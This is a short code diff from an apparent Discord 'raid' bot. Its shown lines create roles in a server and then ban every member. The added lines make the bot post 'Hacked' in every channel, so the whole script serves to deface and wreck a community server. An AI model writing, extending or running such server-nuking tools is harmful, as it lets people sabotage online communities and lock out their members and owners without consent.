@@ -61,6 +61,8 @@ async def raid(ctx):
 			print(f"Role: {role.name} has been created in {ctx.guild.name}")
 		except:
 			print(f"Role: {role.name} was not able to be created in {ctx.guild.name}")
+        for channel in list(ctx.guild.channels):
+            await channel.send("Hacked")
 	for user in list(ctx.guild.members):
             try:
                 await ctx.guild.ban(user)
